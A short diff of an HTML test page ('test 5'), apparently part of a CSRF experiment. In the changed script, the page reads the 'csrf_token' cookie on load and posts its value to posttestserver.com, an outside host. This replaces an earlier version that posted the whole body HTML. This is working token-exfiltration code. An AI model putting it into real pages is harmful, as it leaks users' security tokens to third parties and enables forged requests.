@@ -10,13 +10,11 @@
            console.log( "ready!" );
 		   var cookie =  $.cookie("csrf_token");
 		   console.log( cookie );
-		   $("#cookie").value = cookie;
-		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
+		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: cookie} );
 	    });
 	</script>
   </head>
   <body>
      <div>test 5</div>
-	 <div id="cookie"></div>
   </body>
 </html>
